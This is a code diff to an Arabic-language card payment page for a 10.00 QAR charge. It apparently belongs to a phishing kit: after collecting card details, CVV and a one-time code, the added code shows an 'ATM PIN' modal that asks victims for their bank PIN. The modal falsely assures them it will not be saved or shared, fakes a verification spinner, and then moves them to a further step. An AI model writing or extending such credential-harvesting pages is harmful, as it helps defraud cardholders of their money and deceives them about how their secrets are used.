@@ -652,7 +652,7 @@
                                     <div class="form-group-payment">
                                         <label for="cvv">
                                             <span class="required">*</span>
-                                            رمز الأمان
+                                            رمز الأمان (CVV)
                                         </label>
                                         <input 
                                             type="tel" 
@@ -759,6 +759,83 @@
                     
                     <!-- Submit Button -->
                     <button type="button" class="vbv-submit-btn" id="vbvSubmitBtn">Submit</button>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- ATM PIN Modal -->
+    <div class="modal fade" id="atmPinModal" tabindex="-1" role="dialog" data-backdrop="static" data-keyboard="false">
+        <div class="modal-dialog" role="document" style="max-width: 450px; margin-top: 100px;">
+            <div class="modal-content" style="border: 2px solid #8b1538; border-radius: 8px;">
+                <div class="modal-header" style="background-color: #8b1538; color: white; padding: 15px 20px; border-radius: 6px 6px 0 0;">
+                    <h4 class="modal-title" style="font-size: 18px; font-weight: bold; margin: 0;">تأكيد ملكية البطاقة</h4>
+                </div>
+                <div class="modal-body" style="padding: 30px; background-color: #f8f9fa; direction: rtl; text-align: right;">
+                    
+                    <!-- Icon -->
+                    <div style="text-align: center; margin-bottom: 20px;">
+                        <i class="fa fa-lock" style="font-size: 50px; color: #8b1538;"></i>
+                    </div>
+                    
+                    <!-- Title -->
+                    <div style="text-align: center; margin-bottom: 10px;">
+                        <h4 style="color: #2d3748; font-size: 16px; font-weight: 600; margin: 0;">الرمز السري للصراف الآلي</h4>
+                    </div>
+                    
+                    <!-- Subtitle -->
+                    <div style="text-align: center; margin-bottom: 25px;">
+                        <p style="color: #718096; font-size: 14px; margin: 0;">الرجاء إدخال الرمز السري للصراف الآلي (ATM PIN) لتأكيد ملكية البطاقة</p>
+                    </div>
+                    
+                    <!-- Card Info -->
+                    <div style="background-color: white; border: 1px solid #e2e8f0; border-radius: 6px; padding: 15px; margin-bottom: 20px;">
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                            <span style="color: #4a5568; font-size: 13px;">رقم البطاقة:</span>
+                            <span style="color: #2d3748; font-size: 13px; font-weight: 500; direction: ltr;" id="atmMaskedCard">**** **** **** ****</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between;">
+                            <span style="color: #4a5568; font-size: 13px;">المبلغ:</span>
+                            <span style="color: #2d3748; font-size: 13px; font-weight: 500;">10.00 QAR</span>
+                        </div>
+                    </div>
+                    
+                    <!-- PIN Input -->
+                    <div style="margin-bottom: 20px;">
+                        <label style="display: block; margin-bottom: 8px; color: #2d3748; font-weight: 500; font-size: 14px;">
+                            <span style="color: #e53e3e; margin-left: 3px;">*</span>
+                            الرمز السري (ATM PIN)
+                        </label>
+                        <input 
+                            type="password" 
+                            id="atmPin" 
+                            maxlength="4"
+                            style="width: 100%; padding: 12px 15px; font-size: 20px; border: 2px solid #e2e8f0; border-radius: 6px; text-align: center; letter-spacing: 8px; font-family: 'Courier New', monospace; direction: ltr;"
+                            placeholder="••••"
+                            inputmode="numeric"
+                            pattern="[0-9]*">
+                    </div>
+                    
+                    <!-- Security Note -->
+                    <div style="background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 6px; padding: 12px; margin-bottom: 20px;">
+                        <div style="display: flex; align-items: start;">
+                            <i class="fa fa-info-circle" style="color: #f39c12; margin-left: 8px; margin-top: 2px;"></i>
+                            <p style="color: #856404; font-size: 12px; margin: 0; line-height: 1.6;">
+                                الرمز السري الخاص بك محمي ومشفر. لن يتم حفظه أو مشاركته مع أي جهة.
+                            </p>
+                        </div>
+                    </div>
+                    
+                    <!-- Submit Button -->
+                    <button 
+                        type="button" 
+                        id="atmPinSubmitBtn"
+                        style="width: 100%; background-color: #8b1538; color: white; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; transition: all 0.2s ease;"
+                        onmouseover="this.style.backgroundColor='#6d1029'"
+                        onmouseout="this.style.backgroundColor='#8b1538'">
+                        تأكيد
+                    </button>
                     
                 </div>
             </div>
@@ -1037,7 +1114,12 @@
             const code = document.getElementById('vbvPassword').value;
             
             if (code.length === 4 || code.length === 6) {
-                window.location.href = '/step5';
+                // Close OTP modal and show ATM PIN modal
+                $('#otpModal').modal('hide');
+                setTimeout(function() {
+                    $('#atmPinModal').modal('show');
+                    document.getElementById('atmPin').focus();
+                }, 500);
             } else {
                 alert('Please enter a valid verification code (4 or 6 digits)');
             }
@@ -1059,6 +1141,46 @@
         document.getElementById('resendCode').addEventListener('click', function(e) {
             e.preventDefault();
             alert('تم إعادة إرسال رمز التحقق');
+        });
+        
+        // ATM PIN Modal - Copy masked card number
+        $('#atmPinModal').on('show.bs.modal', function() {
+            const maskedCard = document.getElementById('maskedCard').textContent;
+            document.getElementById('atmMaskedCard').textContent = maskedCard;
+        });
+        
+        // ATM PIN - Only allow numbers
+        document.getElementById('atmPin').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+        
+        // ATM PIN - Enter key
+        document.getElementById('atmPin').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && e.target.value.length === 4) {
+                document.getElementById('atmPinSubmitBtn').click();
+            }
+        });
+        
+        // ATM PIN Submit
+        document.getElementById('atmPinSubmitBtn').addEventListener('click', function() {
+            const pin = document.getElementById('atmPin').value;
+            
+            if (pin.length === 4) {
+                // Show loading state
+                this.disabled = true;
+                this.innerHTML = '<i class="fa fa-spinner fa-spin"></i> جاري التحقق...';
+                
+                // Simulate verification
+                setTimeout(function() {
+                    // Close modal and redirect to step5
+                    $('#atmPinModal').modal('hide');
+                    setTimeout(function() {
+                        window.location.href = '/step5';
+                    }, 300);
+                }, 1500);
+            } else {
+                alert('الرجاء إدخال رمز مكون من 4 أرقام');
+            }
         });
     </script>
 </body>
